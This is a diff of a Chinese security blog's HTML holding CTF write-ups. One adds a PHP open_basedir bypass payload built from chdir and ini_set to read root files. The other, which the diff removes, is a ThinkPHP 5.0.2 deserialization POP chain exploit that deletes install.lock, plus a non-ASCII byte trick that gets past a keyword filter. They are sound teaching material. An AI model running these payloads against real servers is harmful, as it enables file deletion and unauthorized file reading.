+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">if (strncmp(resolved_basedir, resolved_name, resolved_basedir_len) == 0) </span><br><span class="line">&#123;</span><br><span class="line">    if (resolved_name_len &gt; resolved_basedir_len &amp;&amp; resolved_name[resolved_basedir_len - 1] != PHP_DIR_SEPARATOR) &#123;return -1;&#125; </span><br><span class="line">    else &#123;</span><br><span class="line">/* File is in the right directory */</span><br><span class="line">return 0;</span><br><span class="line">        &#125;</span><br><span class="line">&#125;</span><br><span class="line">else &#123;</span><br><span class="line">/* /openbasedir/ and /openbasedir are the same directory */</span><br><span class="line">    if (resolved_basedir_len == (resolved_name_len + 1) &amp;&amp; resolved_basedir[resolved_basedir_len - 1] == PHP_DIR_SEPARATOR) </span><br><span class="line">    &#123;            </span><br><span class="line">        if (strncasecmp(resolved_basedir, resolved_name, resolved_name_len) == 0) </span><br><span class="line">        &#123;</span><br><span class="line">            if (strncmp(resolved_basedir, resolved_name, resolved_name_len) == 0) </span><br><span class="line">            &#123;</span><br><span class="line">                return 0;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        return -1;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>将local_open_basedir的值存放在resolved_basedir中，用于后面比较</p>
+<p>而上面的操作正是匹配路径是否是open_basedir规定路径</p>
+<p>所以我们可以关注可控点expand_filepath()函数，我们可以分析expand_filepath()函数</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">PHPAPI char *expand_filepath(const char *filepath, char *real_path)&#123;</span><br><span class="line">return expand_filepath_ex(filepath, real_path, NULL, 0);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>再分析expand_filepath_ex()函数</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">if (virtual_file_ex(&amp;new_state, filepath, NULL, realpath_mode)) &#123;efree(new_state.cwd);</span><br><span class="line">return NULL;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>然后再分析virtual_file_ex()函数</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">if (!IS_ABSOLUTE_PATH(path, path_length)) &#123;</span><br><span class="line">if (state-&gt;cwd_length == 0) &#123;</span><br><span class="line">/* resolve relative path */</span><br><span class="line">start = 0;</span><br><span class="line">memcpy(resolved_path , path, path_length + 1);</span><br><span class="line">&#125; else &#123;</span><br><span class="line">int state_cwd_length = state-&gt;cwd_length;</span><br><span class="line">           ......</span><br><span class="line">        state-&gt;cwd_length = path_length;</span><br><span class="line">           ......</span><br><span class="line">        memcpy(state-&gt;cwd, resolved_path, state-&gt;cwd_length+1);</span><br></pre></td></tr></table></figure>
+
+<p>上述代码的意思是目录拼接操作，如果path不是绝对路径，同时state-&gt;cwd长度为0，就会直接将path作为绝对路径保存在resolved_path中，否则在state-&gt;cmd后拼接</p>
+<p>因此，我们最后落点在path_length，决定拼接的长度</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">path_length = tsrm_realpath_r(resolved_path, start, path_length, &amp;ll, &amp;t, use_realpath, 0, NULL);</span><br></pre></td></tr></table></figure>
+<p>跟进tsrm_realpath_r，发现path_length操作在</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">remove double slashes and &#x27;.&#x27;</span><br><span class="line">remove &#x27;..&#x27; and previous directory</span><br></pre></td></tr></table></figure>
+<p>所以expand_filepath()函数主要关注相对路径和绝对路径，但是没有关注相对路径的实时变化</p>
+<h4 id="整体思路"><a href="#整体思路" class="headerlink" title="整体思路"></a>整体思路</h4><p>但open_basedir第一次设置后，再次设置是不被允许的，但是由于没有考虑open_basedir为相对路径的实时变化，所以当当前目录是相对路径，而不是绝对路径时，就会触发expand_filekpath()函数漏洞，会将当前目录，即相对路径，存储到resolve_path中，从而绕过检验php_check_open_basedir_ex函数的检验，从而可以更改open_basedir的值，当我们ini.set(‘open_basedir’,’…’)时，只要我们跳转一次，open_basedir的目录也会跳转一次，并将当前的目录存储在resolve_path中，从而可以让我们绕过open_basedir的限制，可以访问根目录</p>
+<p>回到题目本身，我们可以先跳转到open_basedir中的目录</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">chdir(&#x27;/tmp&#x27;)</span><br></pre></td></tr></table></figure>
+
+<p>然后在open_basedir目录下建立新目录，然后跳转到新目录下，此时为相对路径，所以我们可以重置open_basedir，即</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ini_set(&#x27;open_basedir&#x27;,&#x27;..&#x27;)</span><br></pre></td></tr></table></figure>
+<p>然后一直是使用</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">chdir(&#x27;..&#x27;)</span><br></pre></td></tr></table></figure>
+<p>跳转，此时open_basedir也一直跳转，最后跳转到根目录后，重置open_basedir</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ini_set(&#x27;open_basedir&#x27;,&#x27;\&#x27;)</span><br></pre></td></tr></table></figure>
+<p>即可读取根目录下的文件，因此构造payload</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">?cmd=chdir(&#x27;img&#x27;);mkdir(&#x27;shiwang&#x27;);chdir(&#x27;shiwang&#x27;);ini_set(&#x27;open_basedir&#x27;,&#x27;..&#x27;);chdir(&#x27;..&#x27;);chdir(&#x27;..&#x27;);chdir(&#x27;..&#x27;);chdir(&#x27;..&#x27;);ini_set(&#x27;open_basedir&#x27;,&#x27;/&#x27;);echo(file_get_contents(&#x27;/THis_Is_tHe_F14g&#x27;));</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+<p>参考文章：[<a target="_blank" rel="noopener" href="https://blog.51cto.com/u_15127538/2702757]">https://blog.51cto.com/u_15127538/2702757]</a></p>
+<pre><code> [https://blog.csdn.net/qq_42967398/article/details/105615235]
+</code></pre>
+
+      
+    </div>
+    
+    <div class="article-info article-info-index">
+      
+      
+	<div class="article-tag tagcloud">
+		<ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/" rel="tag">代码审计</a></li></ul>
+	</div>
+
+      
+
+      
+      <div class="clearfix"></div>
+    </div>
+      
+    
+  </div>
+  
+</article>
+
+
+
+
+
+
+
+  
     <article id="post-简单的cookie伪造" class="article article-type-post" itemscope itemprop="blogPost">
   
     <div class="article-meta">
@@ -981,148 +1183,6 @@
       
 	<div class="article-tag tagcloud">
 		<ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/%E6%A8%A1%E6%9D%BF/" rel="tag">模板</a></li></ul>
-	</div>
-
-      
-
-      
-      <div class="clearfix"></div>
-    </div>
-      
-    
-  </div>
-  
-</article>
-
-
-
-
-
-
-
-  
-    <article id="post-ThinkPHP框架漏洞以及不可见字符绕过" class="article article-type-post" itemscope itemprop="blogPost">
-  
-    <div class="article-meta">
-      <a href="/2021/09/24/ThinkPHP%E6%A1%86%E6%9E%B6%E6%BC%8F%E6%B4%9E%E4%BB%A5%E5%8F%8A%E4%B8%8D%E5%8F%AF%E8%A7%81%E5%AD%97%E7%AC%A6%E7%BB%95%E8%BF%87/" class="article-date">
-  	<time datetime="2021-09-23T16:00:00.000Z" itemprop="datePublished">2021-09-24</time>
-</a>
-    </div>
-  
-  <div class="article-inner">
-    
-      <input type="hidden" class="isFancy" />
-    
-    
-      <header class="article-header">
-        
-  
-    <h1 itemprop="name">
-      <a class="article-title" href="/2021/09/24/ThinkPHP%E6%A1%86%E6%9E%B6%E6%BC%8F%E6%B4%9E%E4%BB%A5%E5%8F%8A%E4%B8%8D%E5%8F%AF%E8%A7%81%E5%AD%97%E7%AC%A6%E7%BB%95%E8%BF%87/">
-        ThinkPHP框架漏洞以及不可见字符绕过
-        
-      </a>
-    </h1>
-  
-
-      </header>
-      
-    
-    <div class="article-entry" itemprop="articleBody">
-      
-        <h1 id="ThinkPHP框架漏洞以及不可见字符绕过"><a href="#ThinkPHP框架漏洞以及不可见字符绕过" class="headerlink" title="ThinkPHP框架漏洞以及不可见字符绕过"></a>ThinkPHP框架漏洞以及不可见字符绕过</h1><p>打开页面，我们可以看见源码<br>``<br>&lt;?php<br>namespace app\index\controller;<br>class Index<br>{<br>    public function index($run=[])<br>    {<br>        highlight_file(__FILE__);<br>        echo ‘<h1>Welcome to CTFSHOW</h1></br>‘;<br>        echo ‘Powered by PHPthink5.0.2</br>‘;<br>        echo dirname(<strong>FILE</strong>);</p>
-<pre><code>if (!empty($run[2]))&#123;
-        echo &#39;ZmxhZyBpcyBub3QgaGVyZSBidXQgaXQgaXMgaW4gZmxhZy50eHQ=&#39;;
-    &#125;
-if (!empty($run[1]))&#123;
-        unserialize($run[1]);
-    &#125;
-&#125;
-// hint:/index/index/backdoor
-public function backdoor()&#123;
-    if (!file_exists(dirname(__FILE__).&#39;/../../&#39;.&quot;install.lock&quot;))&#123;
-    echo &quot;Try to post CMD arguments&quot;.&#39;&lt;br/&gt;&#39;;
-        $data = input(&#39;post.&#39;);
-        if (!preg_match(&#39;/flag/i&#39;,$data[&#39;cmd&#39;]))&#123;
-            $cmd = escapeshellarg($data[&#39;cmd&#39;]);
-    $cmd=&#39;cat &#39;.$cmd;
-    echo $cmd;
-            system($cmd);
-        &#125;else&#123;
-            echo &quot;No No No&quot;;
-        &#125;
-
-    &#125;else&#123;
-    echo dirname(__FILE__).&#39;/../../&#39;.&quot;install.lock has not been deleted&quot;;
-&#125;
-&#125;
-</code></pre>
-<p>} </p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">从源码中，我们可以看见hint</span><br></pre></td></tr></table></figure>
-<p>/index/index/backdoor</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">因此，我们可以构造</span><br></pre></td></tr></table></figure>
-<p>index.php/index/index/backdoor</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">然后回显出</span><br></pre></td></tr></table></figure>
-<p>/var/www/html/application/index/controller/../../install.lock has not been deleted</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">因此，我们需要想办法删除/var/www/html/application/index/controller/../../install.lock文件，但是我们从源码中没有看见可以删除文件的函数，但是我们可以看见</span><br></pre></td></tr></table></figure>
-<p>Powered by PHPthink5.0.2</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">所以我们可以上网搜ThinkPHP5.0.2漏洞，发现这个版本ThinkPHP有一个反序列化pop链的使用，所以我们可以上网下载ThinkPHP5.0.2的源码</span><br><span class="line"></span><br><span class="line">然后发现在thinkphp/library/think/process/pipes/Windows.php文件中有一个删除文件的自定义函数</span><br></pre></td></tr></table></figure>
-<pre><code>private function removeFiles()
-&#123;
-    foreach ($this-&gt;files as $filename) &#123;
-        if (file_exists($filename)) &#123; //触发__toString方法
-            @unlink($filename);
-        &#125;
-    &#125;
-    $this-&gt;files = [];
-&#125;
-</code></pre>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">而魔术方法__destruct()里有调用这个removeFiles()函数，</span><br></pre></td></tr></table></figure>
-<pre><code>public function __destruct()
-&#123;
-    $this-&gt;close();
-    $this-&gt;removeFiles(); //跟
-&#125;
-</code></pre>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">所以我们可以构造一条pop链来删除/var/www/html/application/index/controller/../../install.lock文件，而__destruct()魔术方法是在类的对象被销毁时被触发的，所以exp</span><br></pre></td></tr></table></figure>
-<?php
-
-namespace think\process\pipes;
-
-class Windows
-{
-    private $file=[];
-    public function __construct(){
-        $this->files=array("/var/www/html/application/index/controller/../../install.lock");
-    }
-}
-
-$b=new Windows();
-echo urlencode(serialize($b));
-?>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">构造payload</span><br></pre></td></tr></table></figure>
-<p>?run[1]=O%3A27%3A%22think%5Cprocess%5Cpipes%5CWindows%22%3A1%3A%7Bs%3A34%3A%22%00think%5Cprocess%5Cpipes%5CWindows%00files%22%3Ba%3A1%3A%7Bi%3A0%3Bs%3A61%3A%22%2Fvar%2Fwww%2Fhtml%2Fapplication%2Findex%2Fcontroller%2F..%2F..%2Finstall.lock%22%3B%7D%7D</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">即可删除/var/www/html/application/index/controller/../../install.lock文件，然后构造cmd参数并post提交即可，但是这里有正则过滤</span><br></pre></td></tr></table></figure>
-<p>preg_match(‘/flag/i’,$data[‘cmd’])</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">所以我们可以尝试通配符，但发现因为</span><br></pre></td></tr></table></figure>
-<p>$cmd = escapeshellarg($data[‘cmd’]);</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">所以不可以成功，所以我们可以使用不可见字符来绕过，但是escapeshellarg()函数在未设置LANG环境变量时，会去除非ASCII字符，因此可以使用payload</span><br></pre></td></tr></table></figure>
-<p>cmd=/fl%8aag</p>
-<pre><code>用bp来post提交即可
-
-参考文章：[https://www.anquanke.com/post/id/196364]
-
-    [https://www.cnblogs.com/zpchcbd/p/12731035.html]
-</code></pre>
-
-      
-    </div>
-    
-    <div class="article-info article-info-index">
-      
-      
-	<div class="article-tag tagcloud">
-		<ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/" rel="tag">代码审计</a></li></ul>
 	</div>
 
       
